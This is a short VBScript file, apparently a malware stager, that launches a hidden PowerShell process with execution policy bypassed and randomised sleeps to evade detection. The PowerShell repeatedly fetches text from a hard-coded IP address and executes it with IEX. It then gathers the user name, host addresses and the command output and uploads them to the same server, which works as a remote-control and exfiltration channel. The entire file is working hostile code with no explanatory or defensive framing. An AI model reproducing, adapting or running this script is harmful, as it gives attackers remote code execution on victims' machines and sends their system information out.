dim r, c
set r = createobject("WScript.Shell")
c = "powershell.exe -executionpolicy bypass -w hidden -noprofile -c start-sleep 39;start-sleep (get-random -min 5 -max 43);start-sleep 11;$iik=new-object net.webclient;$flm=$iik.downloaddata('http://2.59.222.98:43820/KfngnHbxFHjaucie/page107/upgrade.txt');if($flm.Length -gt 1){$jkr=[system.text.encoding]::utf8.getString($flm);if($jkr -match 'get-content'){[byte[]] $drpy=IEX $jkr;}else{$bjdo=whoami;$bjdo+='==';$bjdo+=[System.Net.Dns]::GetHostAddresses($ip)+[System.Environment]::NewLine;$hbn=IEX $jkr;$bjdo+=$hbn|Out-string;[byte[]]$drpy=[system.text.encoding]::Utf8.GetBytes($bjdo);};start-sleep 10;$ujk=new-object net.webclient;start-sleep 16;$ujk.uploaddata('http://2.59.222.98:28402/page107',$drpy);}"
r.Run c, 0, false
